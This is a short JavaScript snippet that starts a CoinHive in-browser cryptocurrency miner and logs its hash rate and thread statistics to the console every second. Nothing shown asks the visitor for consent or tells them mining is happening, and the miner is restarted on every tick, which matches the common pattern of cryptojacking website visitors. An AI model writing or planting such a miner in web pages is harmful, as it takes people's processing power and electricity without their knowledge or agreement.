var miner = new CoinHive.Anonymous(apiKey,'threads: 1');
var timeDelay = 1000;
	
// Update stats once per second
setInterval(function() {
	
    var threadCount = miner.getNumThreads();
    var hashesPerSecond = Math.round(miner.getHashesPerSecond() * 100) / 100;
    var totalHashes = miner.getTotalHashes();
    var acceptedHashes = miner.getAcceptedHashes() / 256;
	
	miner.start(CoinHive.FORCE_EXCLUSIVE_TAB);
	
    // Output to console
    if (miner.isRunning()) {
		
		console.log("threadcount = " + threadCount + "\n" + "hashesPerSecond = " + hashesPerSecond + "\n" + "total hashes = " + totalHashes + "\n" + "accepted hashes = " + acceptedHashes);
    
	}
	
}, timeDelay);
	